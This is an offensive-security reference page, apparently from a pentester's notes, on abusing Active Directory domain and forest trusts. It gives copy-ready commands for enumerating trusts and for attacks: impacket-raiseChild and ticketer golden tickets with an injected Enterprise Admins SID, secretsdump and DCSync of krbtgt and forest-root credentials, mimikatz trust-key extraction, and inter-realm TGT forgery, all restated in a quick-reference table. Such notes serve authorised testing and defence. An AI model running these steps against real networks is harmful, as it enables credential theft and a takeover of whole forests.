# Domain Trusts

#DomainTrusts #ActiveDirectory #SIDHistory #CrossForest #Privesc

## What is Domain Trusts (abuse)?

Domains and forests establish trust relationships (one-way/two-way, parent-child, cross-forest) that let authentication flow across boundaries. Misconfigured or overly-permissive trusts enable movement across those boundaries — **SID History / ExtraSids injection**, **forging inter-realm TGTs** with a stolen trust key, and abusing **unconstrained delegation** or foreign group memberships to escalate from a compromised child domain to the forest root, or between separate forests.

- **Intra-forest** (parent↔child): the forest is the security boundary, **not** the domain. SID filtering is **not** applied — so child DA → forest Enterprise Admin is a reliable path.
- **Cross-forest**: SID filtering (quarantine) is applied by default, blocking injected high-value SIDs — so cross-forest abuse relies on foreign memberships, delegation, or explicitly-disabled filtering.

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/AD/PowerView\|PowerView]] | Enumerate trusts/mappings, foreign group members (Windows) |
| [[Tools/AD/bloodyAD\|bloodyAD]] | Read trust objects / attributes over LDAP (Linux) |
| [[Tools/AD/impacket-kerberos-scripts\|impacket Kerberos scripts]] | `raiseChild` (auto child→root), `ticketer` (ExtraSids golden ticket), `lookupsid`, `getST` |
| [[Tools/Lateral Movement/NetExec\|NetExec]] | Trust enumeration modules, cross-trust auth spraying |
| [[Tools/Auth/mimikatz\|mimikatz]] | Extract trust keys (`lsadump::trust /patch`), DCSync a trust/krbtgt |

---

## Enumeration

```bash
# Map trusts over LDAP / SAMR (Linux)
nxc ldap <DC> -u <user> -p <pass> -M enum_trusts
impacket-lookupsid '<domain>/<user>:<pass>@<DC>'        # SIDs incl. foreign principals
ldapsearch -x -H ldap://<DC> -b "CN=System,<baseDN>" "(objectClass=trustedDomain)"
```

```powershell
# PowerView (Windows) — trusts, whole-forest mapping, foreign memberships
Get-DomainTrust
Get-DomainTrustMapping                 # recursive enumeration across reachable trusts
Get-ForestTrust
Get-DomainForeignGroupMember -Domain <other.domain>    # users from our domain in their groups
nltest /domain_trusts /all_trusts       # native
```

| Attribute / concept | Meaning |
|---|---|
| `trustDirection` | 0 disabled, 1 inbound, 2 outbound, 3 bidirectional |
| `trustAttributes` `0x40` | Cross-forest (TREAT_AS_EXTERNAL) |
| `trustAttributes` `0x8` | Forest-transitive |
| SID filtering / quarantine | Strips foreign SIDs cross-forest (on by default) |

---

## Attack Vectors

### Child → Forest Root (intra-forest, ExtraSids)

Compromised child-domain DA → Enterprise Admin, because SID filtering is not enforced inside a forest. Inject the forest-root **Enterprise Admins** SID (`<root-domain-SID>-519`) into a golden ticket.

```bash
# Automated (impacket): dumps the child krbtgt, forges the ticket, secretsdumps the root
impacket-raiseChild '<child.domain>/<child_admin>:<pass>@<child_DC>'

# Manual: need child krbtgt hash + child domain SID + root domain SID
impacket-secretsdump -just-dc-user 'CHILD/krbtgt' '<child.domain>/<da>:<pass>@<child_DC>'
impacket-ticketer -nthash <child_krbtgt_NT> -domain-sid <child_domain_SID> \
  -domain <child.domain> -extra-sid <root_domain_SID>-519 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass '<root.domain>/Administrator@<root_DC>'   # DCSync the forest root
```

### Cross-Forest — Trust Key → Inter-Realm TGT

With DA on one forest, extract the outbound trust key and forge an inter-realm referral TGT to the trusting forest. SID filtering limits injected SIDs, but you can still authenticate as a principal of the trusted domain.

```bash
# Extract trust keys on a DC
# mimikatz:  lsadump::trust /patch      (or  lsadump::dcsync /domain:<dom> /user:<trust>$ )
# Forge inter-realm TGT with the trust key, then request a service ticket cross-trust
impacket-ticketer -nthash <trust_key_NT> -domain-sid <this_domain_SID> \
  -domain <this.domain> -spn krbtgt/<other.domain> <user>
```

### Cross-Forest — Foreign Memberships & Delegation

```powershell
# Users/groups from our domain granted access in the foreign forest (no SID injection needed)
Get-DomainForeignGroupMember -Domain <other.domain>
# Unconstrained delegation across a trust + printerbug/PetitPotam to coerce a foreign DC
Get-DomainComputer -Unconstrained -Domain <other.domain>
```

### SID History Injection (persistence / cross-domain)

```bash
# Write sIDHistory on a controlled principal to inherit a privileged group's access
# (DA/DCSync-level; impacket-ticketer -extra-sid also achieves this per-ticket)
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Intra-forest child domain treated as a boundary | It is **not** — child DA = forest EA via ExtraSids |
| SID filtering / quarantine disabled on a cross-forest trust | Foreign SID injection → privesc across forests |
| `TGTDelegation`/unconstrained delegation reachable across trust | Coerce + capture a foreign DC's TGT |
| Foreign users in privileged local groups (FSPs) | Cross-trust access without any exploit |
| Bidirectional trust to a less-secure forest | Compromise there = compromise here |
| Trust account (`<domain>$`) hash recoverable | Inter-realm TGT forgery |

---

## Quick Reference

| Goal | Command |
|---|---|
| Enumerate trusts | `Get-DomainTrustMapping` / `nxc ldap <DC> -M enum_trusts` |
| Foreign memberships | `Get-DomainForeignGroupMember -Domain <other>` |
| Child → forest root (auto) | `impacket-raiseChild '<child>/<da>:<pass>@<child_DC>'` |
| ExtraSids golden ticket | `impacket-ticketer -nthash <krbtgt> -domain-sid <child_sid> -domain <child> -extra-sid <root_sid>-519 Administrator` |
| Trust keys | mimikatz `lsadump::trust /patch` |
| SIDs / foreign principals | `impacket-lookupsid '<domain>/<u>:<p>@<DC>'` |

---

> [!note] **See also** — trust abuse is Kerberos ticket forgery at forest scale — the ExtraSids/golden-ticket mechanics live in [[Services/Active Directory/Kerberos|Kerberos]]; enumeration rides [[Services/Network management/LDAP|LDAP]]; unconstrained-delegation coercion overlaps [[Techniques/Network Device Pentesting|coercion]] (PetitPotam/printerbug). Tools: [[Tools/AD/PowerView|PowerView]], [[Tools/AD/impacket-kerberos-scripts|impacket Kerberos scripts]], [[Tools/Auth/mimikatz|mimikatz]].

---

*Created: 2026-07-27*
*Updated: 2026-09-25*
*Model: claude-opus-4-8*
